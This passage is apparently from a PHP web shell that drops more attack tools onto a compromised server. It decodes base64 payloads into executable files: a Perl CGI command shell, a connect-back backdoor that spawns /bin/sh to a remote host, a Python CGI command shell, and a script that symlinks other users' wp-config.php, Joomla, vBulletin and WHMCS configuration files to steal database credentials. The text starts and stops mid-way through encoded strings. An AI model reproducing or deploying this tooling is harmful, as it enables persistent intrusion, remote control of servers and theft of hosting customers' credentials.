LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1
c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZS4gSWYgdGhlCiMgZmlsZW5hbWUgaXMgbm90IHNw
ZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkg
YQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5k
IHByb3ZpZGVzIGEgbGluawojIHRocm91Z2ggIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9h
ZGVkLgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBEb3dubG9hZEZpbGUKewoJIyBpZiBubyBm
aWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIGRvd25sb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFu
c2ZlckZpbGUgZXEgIiIpCgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCSZQcmludEZpbGVE
b3dubG9hZEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCQlyZXR1cm47Cgl9CgkKCSMgZ2V0IGZ1
bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQKCWlmKCgkV2lu
TlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfAoJCSghJFdpbk5UICYgKCRUcmFu
c2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQoJewoJCSRUYXJnZXRGaWxl
ID0gJFRyYW5zZmVyRmlsZTsKCX0KCWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlCgl7CgkJY2hvcCgk
VGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsK
CQkkVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOwoJfQoKCWlmKCRPcHRpb25z
IGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlCgl7CgkJJlNlbmRGaWxlVG9Ccm93
c2VyKCRUYXJnZXRGaWxlKTsKCX0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGlu
ayBwYWdlCgl7CgkJJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7Cgl9Cn0KCiMt
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBNYWluIFByb2dyYW0gLSBFeGVjdXRpb24gU3RhcnRzIEhl
cmUKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQomUmVhZFBhcnNlOwomR2V0Q29va2llczsKCiRTY3Jp
cHRMb2NhdGlvbiA9ICRFTlZ7J1NDUklQVF9OQU1FJ307CiRTZXJ2ZXJOYW1lID0gJEVOVnsnU0VS
VkVSX05BTUUnfTsKJExvZ2luUGFzc3dvcmQgPSAkaW57J3AnfTsKJFJ1bkNvbW1hbmQgPSAkaW57
J2MnfTsKJFRyYW5zZmVyRmlsZSA9ICRpbnsnZid9OwokT3B0aW9ucyA9ICRpbnsnbyd9OwoKJEFj
dGlvbiA9ICRpbnsnYSd9OwokQWN0aW9uID0gImxvZ2luIiBpZigkQWN0aW9uIGVxICIiKTsgIyBu
byBhY3Rpb24gc3BlY2lmaWVkLCB1c2UgZGVmYXVsdAoKIyBnZXQgdGhlIGRpcmVjdG9yeSBpbiB3
aGljaCB0aGUgY29tbWFuZHMgd2lsbCBiZSBleGVjdXRlZAokQ3VycmVudERpciA9ICRpbnsnZCd9
OwpjaG9wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7Cgok
TG9nZ2VkSW4gPSAkQ29va2llc3snU0FWRURQV0QnfSBlcSAkUGFzc3dvcmQ7CgppZigkQWN0aW9u
IGVxICJsb2dpbiIgfHwgISRMb2dnZWRJbikgIyB1c2VyIG5lZWRzL2hhcyB0byBsb2dpbgp7Cgkm
UGVyZm9ybUxvZ2luOwoKfQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikgIyB1c2VyIHdhbnRz
IHRvIHJ1biBhIGNvbW1hbmQKewoJJkV4ZWN1dGVDb21tYW5kOwp9CmVsc2lmKCRBY3Rpb24gZXEg
InVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlCnsKCSZVcGxvYWRGaWxlOwp9
CmVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEg
ZmlsZQp7CgkmRG93bmxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImxvZ291dCIpICMgdXNl
ciB3YW50cyB0byBsb2dvdXQKewoJJlBlcmZvcm1Mb2dvdXQ7Cn0=
';

$file = fopen("izo.cin" ,"w+");
$write = fwrite ($file ,base64_decode($cgishellizocin));
fclose($file);
    chmod("izo.cin",0755);
$netcatshell = 'IyEvdXNyL2Jpbi9wZXJsDQogICAgICB1c2UgU29ja2V0Ow0KICAgICAgcHJpbnQgIkRhdGEgQ2hh
MHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQogICAgICBpZiAoISRBUkdWWzBdKSB7DQog
ICAgICAgIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogICAgICAgIGV4aXQo
MSk7DQogICAgICB9DQogICAgICBwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KICAg
ICAgJGhvc3QgPSAkQVJHVlswXTsNCiAgICAgICRwb3J0ID0gODA7DQogICAgICBpZiAoJEFSR1Zb
MV0pIHsNCiAgICAgICAgJHBvcnQgPSAkQVJHVlsxXTsNCiAgICAgIH0NCiAgICAgIHByaW50ICJb
Kl0gQ29ubmVjdGluZy4uLlxuIjsNCiAgICAgICRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3An
KSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0KICAgICAgc29ja2V0KFNFUlZFUiwgUEZf
SU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCiAg
ICAgIG15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KICAgICAgaWYgKCFjb25uZWN0KFNF
UlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogICAgICAgIGRpZSgi
VW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBTcGF3bmlu
ZyBTaGVsbFxuIjsNCiAgICAgIGlmICghZm9yayggKSkgew0KICAgICAgICBvcGVuKFNURElOLCI+
JlNFUlZFUiIpOw0KICAgICAgICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgICAgICAgb3Bl
bihTVERFUlIsIj4mU0VSVkVSIik7DQogICAgICAgIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAu
ICJcMCIgeCA0Ow0KICAgICAgICBleGl0KDApOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBE
YXRhY2hlZFxuXG4iOw==';

$file = fopen("dc.pl" ,"w+");
$write = fwrite ($file ,base64_decode($netcatshell));
fclose($file);
    chmod("dc.pl",0755);
echo "<iframe src=cgishell/izo.cin width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit14']))
{
    mkdir('python', 0755);
    chdir('python');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "AddHandler cgi-script .izo";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$pythonp = 'IyEvdXNyL2Jpbi9weXRob24KIyAwNy0wNy0wNAojIHYxLjAuMAoKIyBjZ2ktc2hlbGwucHkKIyBB
IHNpbXBsZSBDR0kgdGhhdCBleGVjdXRlcyBhcmJpdHJhcnkgc2hlbGwgY29tbWFuZHMuCgoKIyBD
b3B5cmlnaHQgTWljaGFlbCBGb29yZAojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQg
cmVsaWNlbnNlIHRoaXMgY29kZS4KCiMgTm8gd2FycmFudHkgZXhwcmVzcyBvciBpbXBsaWVkIGZv
ciB0aGUgYWNjdXJhY3ksIGZpdG5lc3MgdG8gcHVycG9zZSBvciBvdGhlcndpc2UgZm9yIHRoaXMg
Y29kZS4uLi4KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISEKCiMgRS1tYWlsIG1pY2hhZWwgQVQg
Zm9vcmQgRE9UIG1lIERPVCB1awojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsv
YXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbAoKIiIiCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8g
ZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLgoiIiIKIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIEltcG9ydHMKdHJ5
OgogICAgaW1wb3J0IGNnaXRiOyBjZ2l0Yi5lbmFibGUoKQpleGNlcHQ6CiAgICBwYXNzCmltcG9y
dCBzeXMsIGNnaSwgb3MKc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQKZnJvbSB0aW1lIGltcG9ydCBz
dHJmdGltZQppbXBvcnQgdHJhY2ViYWNrCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPCmZy
b20gdHJhY2ViYWNrIGltcG9ydCBwcmludF9leGMKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBjb25zdGFudHMKCmZvbnRs
aW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQt
c2l6ZToxMnB0OyI+Jwp2ZXJzaW9uc3RyaW5nID0gJ1ZlcnNpb24gMS4wLjAgN3RoIEp1bHkgMjAw
NCcKCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToKICAgIHNjcmlwdG5hbWUg
PSBvcy5lbnZpcm9uWyJTQ1JJUFRfTkFNRSJdCmVsc2U6CiAgICBzY3JpcHRuYW1lID0gIiIKCk1F
VEhPRCA9ICciUE9TVCInCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgUHJpdmF0ZSBmdW5jdGlvbnMgYW5kIHZhcmlhYmxl
cwoKZGVmIGdldGZvcm0odmFsdWVsaXN0LCB0aGVmb3JtLCBub3RwcmVzZW50PScnKToKICAgICIi
IlRoaXMgZnVuY3Rpb24sIGdpdmVuIGEgQ0dJIGZvcm0sIGV4dHJhY3RzIHRoZSBkYXRhIGZyb20g
aXQsIGJhc2VkIG9uCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFs
dWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLgogICAgKGUu
Zy4gdG8gcmV0dXJuIE5vbmUgc28geW91IGNhbiB0ZXN0IGZvciBtaXNzaW5nIGtleXdvcmRzIC0g
d2hlcmUgJycgaXMgYSB2YWxpZCBhbnN3ZXIgYnV0IHRvIGhhdmUgdGhlIGZpZWxkIG1pc3Npbmcg
aXNuJ3QuKSIiIgogICAgZGF0YSA9IHt9CiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0OgogICAg
ICAgIGlmIG5vdCB0aGVmb3JtLmhhc19rZXkoZmllbGQpOgogICAgICAgICAgICBkYXRhW2ZpZWxk
XSA9IG5vdHByZXNlbnQKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiAgdHlwZSh0aGVmb3Jt
W2ZpZWxkXSkgIT0gdHlwZShbXSk6CiAgICAgICAgICAgICAgICBkYXRhW2ZpZWxkXSA9IHRoZWZv
cm1bZmllbGRdLnZhbHVlCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICB2YWx1ZXMg
PSBtYXAobGFtYmRhIHg6IHgudmFsdWUsIHRoZWZvcm1bZmllbGRdKSAgICAgIyBhbGxvd3MgZm9y
IGxpc3QgdHlwZSB2YWx1ZXMKICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdmFsdWVzCiAg
ICByZXR1cm4gZGF0YQoKCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1z
aGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+CjxCT0RZPjxDRU5URVI+
CjxIMT5XZWxjb21lIHRvIGNnaS1zaGVsbC5weSAtIDxCUj5hIFB5dGhvbiBDR0k8L0gxPgo8Qj48
ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPgoiIiIrZm9udGxpbmUgKyJWZXJzaW9uIDogIiArIHZl
cnNpb25zdHJpbmcgKyAiIiIsIFJ1bm5pbmcgb24gOiAiIiIgKyBzdHJmdGltZSgnJUk6JU0gJXAs
ICVBICVkICVCLCAlWScpKycuPC9DRU5URVI+PEJSPicKCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIg
Q29tbWFuZDwvSDI+CjxGT1JNIE1FVEhPRD1cIiIiIiArIE1FVEhPRCArICciIGFjdGlvbj0iJyAr
IHNjcmlwdG5hbWUgKyAiIiJcIj4KPGlucHV0IG5hbWU9Y21kIHR5cGU9dGV4dD48QlI+CjxpbnB1
dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+CjwvRk9STT48QlI+PEJSPiIiIgpib2R5
ZW5kID0gJzwvQk9EWT48L0hUTUw+JwplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5n
IFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBtYWluIGJvZHkgb2YgdGhlIHNj
cmlwdAoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHByaW50ICJDb250ZW50LXR5cGU6
IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyCiAg
ICBwcmludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzbyBpcyB0aGlzIGJs
YW5rIGxpbmUKICAgIGZvcm0gPSBjZ2kuRmllbGRTdG9yYWdlKCkKICAgIGRhdGEgPSBnZXRmb3Jt
KFsnY21kJ10sZm9ybSkKICAgIHRoZWNtZCA9IGRhdGFbJ2NtZCddCiAgICBwcmludCB0aGVmb3Jt
aGVhZAogICAgcHJpbnQgdGhlZm9ybQogICAgaWYgdGhlY21kOgogICAgICAgIHByaW50ICc8SFI+
PEJSPjxCUj4nCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJS
PicKICAgICAgICBwcmludCAnUmVzdWx0IDogPEJSPjxCUj4nCiAgICAgICAgdHJ5OgogICAgICAg
ICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkKICAgICAg
ICAgICAgY2hpbGRfc3RkaW4uY2xvc2UoKQogICAgICAgICAgICByZXN1bHQgPSBjaGlsZF9zdGRv
dXQucmVhZCgpCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpCiAgICAgICAgICAgIHBy
aW50IHJlc3VsdC5yZXBsYWNlKCdcbicsICc8QlI+JykKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlv
biwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNv
bW1hbmQKICAgICAgICAgICAgcHJpbnQgZXJyb3JtZXNzCiAgICAgICAgICAgIGYgPSBTdHJpbmdJ
TygpCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpCiAgICAgICAgICAgIGEgPSBmLmdldHZh
bHVlKCkuc3BsaXRsaW5lcygpCiAgICAgICAgICAgIGZvciBsaW5lIGluIGE6CiAgICAgICAgICAg
ICAgICBwcmludCBsaW5lCgogICAgcHJpbnQgYm9keWVuZAoKCiIiIgpUT0RPL0lTU1VFUwoKCgpD
SEFOR0VMT0cKCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wCkEgdmVyeSBiYXNpYyBzeXN0
ZW0gZm9yIGV4ZWN1dGluZyBzaGVsbCBjb21tYW5kcy4KSSBtYXkgZXhwYW5kIGl0IGludG8gYSBw
cm9wZXIgJ2Vudmlyb25tZW50JyB3aXRoIHNlc3Npb24gcGVyc2lzdGVuY2UuLi4KIiIi';

$file = fopen("python.izo" ,"w+");
$write = fwrite ($file ,base64_decode($pythonp));
fclose($file);
    chmod("python.izo",0755);
   echo "<iframe src=python/python.izo width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit11']))
{
    mkdir('configler', 0755);
    chdir('configler');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "AddHandler cgi-script .izo";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$configshell = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBl
OiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9E
VEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRt
bDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3
LnczLm9yZy8xOTk5L3hodG1sIj4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1M
YW5ndWFnZSIgY29udGVudD0iZW4tdXMiIC8+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5
cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjx0aXRsZT5bfl0gQ3li
M3ItRFogQ29uZmlnIC0gW35dIDwvdGl0bGU+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KLm5l
d1N0eWxlMSB7DQogZm9udC1mYW1pbHk6IFRhaG9tYTsNCiBmb250LXNpemU6IHgtc21hbGw7DQog
Zm9udC13ZWlnaHQ6IGJvbGQ7DQogY29sb3I6ICMwMEZGRkY7DQogIHRleHQtYWxpZ246IGNlbnRl
cjsNCn0NCjwvc3R5bGU+DQo8L2hlYWQ+DQonOw0Kc3ViIGxpbHsNCiAgICAoJHVzZXIpID0gQF87
DQokbXNyID0gcXh7cHdkfTsNCiRrb2xhPSRtc3IuIi8iLiR1c2VyOw0KJGtvbGE9fnMvXG4vL2c7
IA0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2NvbmZpZ3Vy
ZS5waHAnLCRrb2xhLictc2hvcC50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJs
aWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywka29sYS4nLWFtZW1iZXIudHh0Jyk7DQpz
eW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLmluYy5waHAnLCRrb2xh
LictYW1lbWJlcjIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwv
bWVtYmVycy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1tZW1iZXJzLnR4dCcpOw0Kc3ltbGlu
aygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRrb2xhLicyLnR4dCcp
Ow0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2Nv
bmZpZy5waHAnLCRrb2xhLictZm9ydW0udHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicv
cHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRrb2xhLic1LnR4dCcpOw0Kc3ltbGluaygnL2hv
bWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRrb2xhLic0LnR4dCcp
Ow0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRr
b2xhLictd3AxMy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9i
bG9nL3dwLWNvbmZpZy5waHAnLCRrb2xhLictd3AtYmxvZy50eHQnKTsNCnN5bWxpbmsoJy9ob21l
LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRrb2xhLic2LnR4dCcpOw0K
c3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGUvZGIucGhwJywka29s
YS4nNy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25uZWN0
LnBocCcsJGtvbGEuJzgudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0
bWwvbWtfY29uZi5waHAnLCRrb2xhLic5LnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4n
L3B1YmxpY19odG1sL2luY2x1ZGUvY29uZmlnLnBocCcsJGtvbGEuJzEyLnR4dCcpOw0Kc3ltbGlu
aygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcs
JGtvbGEuJy1qb29tbGEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0
bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJy12Yi50eHQnKTsNCnN5bWxpbmsoJy9o
b21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nLWlu
Y2x1ZGVzLXZiLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3do
bS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy13aG0xNS50eHQnKTsNCnN5bWxpbmsoJy9ob21l
LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXdo
bWMxNi50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jcy9j
b25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy13aG1jcy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycu
JHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXN1
cHBvcnQudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmln
dXJhdGlvbi5waHAnLCRrb2xhLicxd2htY3MudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2Vy
LicvcHVibGljX2h0bWwvc3VibWl0dGlja2V0LnBocCcsJGtvbGEuJy13aG1jczIudHh0Jyk7DQpz
eW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9u
LnBocCcsJGtvbGEuJy1jbGllbnRzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1
YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1jbGllbnQudHh0Jyk7
DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZXMvY29uZmlndXJh
dGlvbi5waHAnLCRrb2xhLictY2xpZW50cy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIu
Jy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWJpbGxpbmcu
dHh0Jyk7IA0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25m
aWd1cmF0aW9uLnBocCcsJGtvbGEuJy1iaWxsaW5nLnR4dCcpOyANCnN5bWxpbmsoJy9ob21lLycu
JHVzZXIuJy9wdWJsaWNfaHRtbC9teS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1iaWxsaW5n
LnR4dCcpOyANCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29u
ZmlndXJhdGlvbi5waHAnLCRrb2xhLictYmlsbGluZy50eHQnKTsgDQp9DQppZiAoJEVOVnsnUkVR
VUVTVF9NRVRIT0QnfSBlcSAnUE9TVCcpIHsNCiAgcmVhZChTVERJTiwgJGJ1ZmZlciwgJEVOVnsn
Q09OVEVOVF9MRU5HVEgnfSk7DQp9IGVsc2Ugew0KICAkYnVmZmVyID0gJEVOVnsnUVVFUllfU1RS
SU5HJ307DQp9DQpAcGFpcnMgPSBzcGxpdCgvJi8sICRidWZmZXIpOw0KZm9yZWFjaCAkcGFpciAo
QHBhaXJzKSB7DQogICgkbmFtZSwgJHZhbHVlKSA9IHNwbGl0KC89LywgJHBhaXIpOw0KICAkbmFt
ZSA9fiB0ci8rLyAvOw0KICAkbmFtZSA9fiBzLyUoW2EtZkEtRjAtOV1bYS1mQS1GMC05XSkvcGFj
aygiQyIsIGhleCgkMSkpL2VnOw0KICAkdmFsdWUgPX4gdHIvKy8gLzsNCiAgJHZhbHVlID1+IHMv
JShbYS1mQS1GMC05XVthLWZBLUYwLTldKS9wYWNrKCJDIiwgaGV4KCQxKSkvZWc7DQogICRGT1JN
eyRuYW1lfSA9ICR2YWx1ZTsNCn0NCmlmICgkRk9STXtwYXNzfSBlcSAiIil7DQpwcmludCAnDQo8
Ym9keSBjbGFzcz0ibmV3U3R5bGUxIiBiZ2NvbG9yPSIjMDAwMDAwIj4NCjxwPkN5YjNyLWR6IENv
bmZpZyBGdWNrIFNjcmlwdDwvcD4NCjxwPjxmb250IGNvbG9yPSIjQzBDMEMwIj5bPC9mb250PiBD
b2RlZCBCeSBDeWIzci1EWiA8Zm9udCBjb2xvcj0iI0MwQzBDMCI+fDwvZm9udD4gDQreYSBATy4g
ZskcZS8g3mE8c3BhbiBpZD0icmVzdWx0X2JveCIgY2xhc3M9InNob3J0X3RleHQiIGxhbmc9ImVu
Ij48c3BhbiBzdHlsZSB0aXRsZT4NCjxmb250IGNvbG9yPSIjQzBDMEMwIj58PC9mb250Pjwvc3Bh
bj48L3NwYW4+IDxhIGhyZWY9Imh0dHA6Ly93d3cud3d3LnNlYzRldmVyLmNvbSI+DQo8c3BhbiBz
dHlsZT0idGV4dC1kZWNvcmF0aW9uOiBub25lIj48Zm9udCBjb2xvcj0iIzAwRkYwMCI+d3d3LnNl
YzRldmVyLmNvbTwvZm9udD48L3NwYW4+PC9hPiANCjxmb250IGNvbG9yPSIjQzBDMEMwIj5dPC9m
b250PjwvcD4NCjxmb3JtIG1ldGhvZD0icG9zdCI+DQo8dGV4dGFyZWEgbmFtZT0icGFzcyIgc3R5
bGU9ImJvcmRlcjoxcHggZG90dGVkICMwMEZGRkY7IHdpZHRoOiA1NDNweDsgaGVpZ2h0OiA0MjBw
eDsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDOyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6
ZTo4cHQ7IGNvbG9yOiMwMEZGRkYiICA+PC90ZXh0YXJlYT48YnIgLz4NCiZuYnNwOzxwPg0KPGlu
